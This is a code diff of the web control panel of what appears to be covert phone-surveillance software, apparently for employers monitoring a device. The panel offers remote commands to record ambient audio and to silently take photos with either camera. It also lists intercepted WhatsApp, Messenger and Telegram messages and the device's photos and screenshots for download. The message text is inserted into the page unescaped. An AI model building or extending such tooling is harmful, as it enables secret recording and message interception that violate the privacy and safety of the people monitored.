+                        <div id="incoming-chats-list" class="chat-list"></div>
+                    </div>
+                    <div id="incoming-messages" style="display:none">
+                        <div class="back-row">
+                            <button class="btn btn-outline" onclick="backFromMessages()">← Back</button>
+                        </div>
+                        <h4 id="incoming-messages-title" class="section-title"></h4>
+                        <div id="incoming-messages-list" class="msg-thread"></div>
+                    </div>
+                </div>
+
+                <!-- Outgoing -->
+                <div id="msg-outgoing" style="display:none">
+                    <div class="table-wrap">
+                        <table>
+                            <tr><th>App</th><th>Sent To</th><th>Message</th><th>Date</th></tr>
+                            ${notifications.filter(function(n) { return n.direction === 'outgoing'; }).map(function(n) {
+                                return '<tr>'
+                                    + '<td>' + n.app + '</td>'
+                                    + '<td>' + (n.recipient || n.chat_id || '-') + '</td>'
+                                    + '<td class="cell-text">' + n.message + '</td>'
+                                    + '<td>' + new Date(n.received_at).toLocaleString() + '</td>'
+                                    + '</tr>';
+                            }).join('')}
+                        </table>
+                    </div>
+                </div>
+            </div>
+        </div>
+
         <!-- Remote Control Tab -->
-<div id="tab-remote" class="tab-content">
-    <div class="card">
-        <h3 style="color:#1a1a2e;margin-bottom:6px">Remote Control</h3>
-        <p style="color:#888;font-size:13px;margin-bottom:20px">Commands are executed within 2 minutes when device is active.</p>
-        
-        <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:16px;margin-bottom:24px">
-            <div style="background:#f8f8f8;border-radius:12px;padding:20px;text-align:center">
-                <div style="font-size:36px;margin-bottom:8px">🎙️</div>
-                <h4 style="color:#1a1a2e;margin-bottom:8px">Record Ambient</h4>
-                <p style="color:#888;font-size:12px;margin-bottom:12px">Record surroundings for 30 seconds</p>
-                <select id="record-duration" style="width:100%;padding:6px;border:1px solid #ddd;border-radius:6px;margin-bottom:8px;font-size:13px">
-                    <option value="15">15 seconds</option>
-                    <option value="30" selected>30 seconds</option>
-                    <option value="60">1 minute</option>
-                    <option value="120">2 minutes</option>
-                    <option value="300">5 minutes</option>
-                </select>
-                <button class="btn btn-primary" onclick="sendCommand('record_ambient')" style="width:100%">Start Recording</button>
-            </div>
-            
-            <div style="background:#f8f8f8;border-radius:12px;padding:20px;text-align:center">
-                <div style="font-size:36px;margin-bottom:8px">📷</div>
-                <h4 style="color:#1a1a2e;margin-bottom:8px">Take Photo</h4>
-                <p style="color:#888;font-size:12px;margin-bottom:12px">Silently capture front or back camera</p>
-                <select id="camera-facing" style="width:100%;padding:6px;border:1px solid #ddd;border-radius:6px;margin-bottom:8px;font-size:13px">
-                    <option value="back">Back Camera</option>
-                    <option value="front">Front Camera</option>
-                </select>
-                <button class="btn btn-primary" onclick="sendCommand('take_photo')" style="width:100%">Take Photo</button>
-            </div>
-        </div>
+        <div id="tab-remote" class="tab-content">
+            <div class="card">
+                <h3 style="color:#1a1a2e;margin-bottom:6px">Remote Control</h3>
+                <p class="subtext">Commands are executed within 2 minutes when device is active.</p>
 
-        <div id="remote-msg" style="display:none;padding:10px;border-radius:8px;margin-bottom:16px"></div>
+                <div class="remote-grid">
+                    <div class="remote-card">
+                        <div class="remote-icon">🎙️</div>
+                        <h4>Record Ambient</h4>
+                        <p>Record surroundings for 30 seconds</p>
+                        <select id="record-duration">
+                            <option value="15">15 seconds</option>
+                            <option value="30" selected>30 seconds</option>
+                            <option value="60">1 minute</option>
+                            <option value="120">2 minutes</option>
+                            <option value="300">5 minutes</option>
+                        </select>
+                        <button class="btn btn-primary" onclick="sendCommand('record_ambient')">Start Recording</button>
+                    </div>
 
-        <h4 style="color:#1a1a2e;margin-bottom:12px">Recent Results</h4>
-        <div id="remote-results">
-            <p style="color:#888;text-align:center;padding:20px">Loading results...</p>
-        </div>
-    </div>
-</div>
+                    <div class="remote-card">
+                        <div class="remote-icon">📷</div>
+                        <h4>Take Photo</h4>
+                        <p>Silently capture front or back camera</p>
+                        <select id="camera-facing">
+                            <option value="back">Back Camera</option>
+                            <option value="front">Front Camera</option>
+                        </select>
+                        <button class="btn btn-primary" onclick="sendCommand('take_photo')">Take Photo</button>
+                    </div>
+                </div>
 
-     <!-- Media Tab -->
-<div id="tab-media" class="tab-content">
-    <div class="card" style="padding:0">
-        ${media.length === 0 ? '<p class="no-data">No media files</p>' : `
-        <table>
-            <tr><th>Preview</th><th>Filename</th><th>Type</th><th>Actual Size</th><th>Date</th><th>Action</th></tr>
-          ${media.map(m => `<tr>
-    <td>${m.thumbnail ? `<img class="thumb" src="data:image/jpeg;base64,${m.thumbnail}" style="cursor:pointer" data-src="data:image/jpeg;base64,${m.thumbnail}" onclick="openLightbox(this)"/>` : 'No preview'}</td>
-    <td>${m.filename}</td>
-    <td>${m.is_screenshot ? '📸 Screenshot' : '🖼️ Photo'}</td>
-    <td>${Math.round(m.size_bytes / 1024)}KB</td>
-    <td>${new Date(m.date_taken).toLocaleString()}</td>
-    <td><button class="btn btn-sm btn-primary" onclick="requestDownload('${token}','${m.filename}','${m._id}')">Download Full</button></td>
-</tr>`).join('')}
-        </table>`}
-    </div>
-</div>
+                <div id="remote-msg" class="msg" style="display:none"></div>
 
-<!-- Lightbox -->
-<div id="lightbox" onclick="closeLightbox()" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:9999;justify-content:center;align-items:center;cursor:pointer">
-    <img id="lightbox-img" style="max-width:90%;max-height:90%;border-radius:8px;"/>
-</div>
-
-     <!-- Messages Tab -->
-<div id="tab-messages" class="tab-content">
-    <div class="card">
-        <div style="display:flex;gap:8px;margin-bottom:16px">
-            <button class="btn btn-primary" onclick="showDirection('incoming', this)" id="btn-incoming">📥 Incoming</button>
-            <button class="btn" onclick="showDirection('outgoing', this)" id="btn-outgoing" style="background:#eee;color:#333">📤 Outgoing</button>
-        </div>
-
-        <!-- Incoming -->
-        <div id="msg-incoming">
-            <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:12px;margin-bottom:16px">
-                ${['Messenger','WhatsApp','Telegram'].map(function(app) {
-                    const count = notifications.filter(function(n) { return n.app === app && n.direction !== 'outgoing'; }).length;
-                    const icon = app === 'Messenger' ? '💬' : app === 'WhatsApp' ? '📱' : '✈️';
-                    return '<div onclick="showIncomingChats(\'' + app + '\')" style="background:#f8f8f8;border-radius:10px;padding:20px;text-align:center;cursor:pointer;border:2px solid #eee" '
-                        + 'onmouseover="this.style.borderColor=\'#1a1a2e\'" onmouseout="this.style.borderColor=\'#eee\'">'
-                        + '<div style="font-size:28px;margin-bottom:8px">' + icon + '</div>'
-                        + '<div style="font-weight:bold;color:#1a1a2e">' + app + '</div>'
-                        + '<div style="color:#888;font-size:12px;margin-top:4px">' + count + ' messages</div>'
-                        + '</div>';
-                }).join('')}
-            </div>
-            <div id="incoming-chats" style="display:none">
-                <button class="btn" onclick="document.getElementById('incoming-chats').style.display='none'" style="background:#eee;color:#333;margin-bottom:12px">← Back</button>
-                <div id="incoming-chats-list"></div>
-            </div>
-            <div id="incoming-messages" style="display:none">
-                <button class="btn" onclick="document.getElementById('incoming-messages').style.display='none';document.getElementById('incoming-chats').style.display='block'" style="background:#eee;color:#333;margin-bottom:12px">← Back</button>
-                <h4 id="incoming-messages-title" style="margin-bottom:12px;color:#1a1a2e"></h4>
-                <div id="incoming-messages-list"></div>
+                <h4 class="section-title">Recent Results</h4>
+                <div id="remote-results">
+                    <p class="no-data">Loading results...</p>
+                </div>
             </div>
         </div>
-
-        <!-- Outgoing -->
-        <div id="msg-outgoing" style="display:none">
-            <table>
-                <tr><th>App</th><th>Sent To</th><th>Message</th><th>Date</th></tr>
-                ${notifications.filter(function(n) { return n.direction === 'outgoing'; }).map(function(n) {
-                    return '<tr>'
-                        + '<td>' + n.app + '</td>'
-                        + '<td>' + (n.recipient || n.chat_id || '-') + '</td>'
-                        + '<td>' + n.message + '</td>'
-                        + '<td>' + new Date(n.received_at).toLocaleString() + '</td>'
-                        + '</tr>';
-                }).join('')}
-            </table>
-        </div>
-    </div>
-</div>
-
-        <!-- Level 2: Chats list -->
-        <div id="msg-level-chats" style="display:none">
-            <div style="display:flex;align-items:center;margin-bottom:16px">
-                <button class="btn" onclick="showApps()" style="background:#eee;color:#333;margin-right:12px">← Back</button>
-                <h3 id="chats-title" style="color:#1a1a2e"></h3>
-            </div>
-            <div id="chats-list"></div>
-        </div>
-
-        <!-- Level 3: Chat messages -->
-        <div id="msg-level-messages" style="display:none">
-            <div style="display:flex;align-items:center;margin-bottom:16px">
-                <button class="btn" onclick="showChatsBack()" style="background:#eee;color:#333;margin-right:12px">← Back</button>
-                <h3 id="messages-title" style="color:#1a1a2e"></h3>
-            </div>
-            <div id="messages-list"></div>
-        </div>
-    </div>
-</div>
 
     </div>
+
+    <!-- Lightbox -->
+    <div id="lightbox" onclick="closeLightbox()">
+        <img id="lightbox-img" alt="Preview"/>
+        <span class="lightbox-close" onclick="event.stopPropagation();closeLightbox()">×</span>
+    </div>
+
     <script>
     if (!localStorage.getItem('employer_id')) window.location.href = '/';
 </script>
